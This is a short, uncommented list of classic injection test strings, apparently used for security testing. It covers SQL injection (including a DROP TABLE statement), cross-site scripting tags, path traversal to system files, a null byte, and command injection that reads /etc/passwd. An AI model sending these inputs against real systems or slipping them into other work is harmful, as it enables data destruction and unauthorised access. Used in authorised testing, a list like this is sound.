# [SECURITY PAYLOAD LIBRARY]

## SQL Injection

'
''

' OR 1=1 --

admin'--

'; DROP TABLE customer;--

## XSS

<script>alert(1)</script>

<img src=x onerror=alert(1)>

"><script>alert(1)</script>

## Path Traversal

../../etc/passwd

..\..\windows\system32

## Null Byte

%00

## Command Injection

; ls -la

&& cat /etc/passwd